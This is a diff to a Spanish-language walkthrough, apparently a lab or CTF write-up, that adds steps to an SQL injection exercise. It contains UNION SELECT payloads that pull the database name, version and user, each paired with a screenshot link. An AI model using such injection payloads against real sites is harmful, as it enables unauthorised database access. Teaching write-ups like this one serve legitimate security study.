@@ -43,3 +43,45 @@ Procedemos ahora a listar la base de datos en la que estamos
 union select 1,2,database(),4,5,6,7-- -
 ```
 ![Resultado de Nmap](IMG/bd.png)
+
+Asi tambien como su version
+
+```
+union select 1,2,version(),4,5,6,7-- -
+```
+![Resultado de Nmap](IMG/version.png)
+
+Como tambien el usuario que esta corriendo la base de datos
+
+```
+union select 1,2,user(),4,5,6,7-- -
+```
+![Resultado de Nmap](IMG/user.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
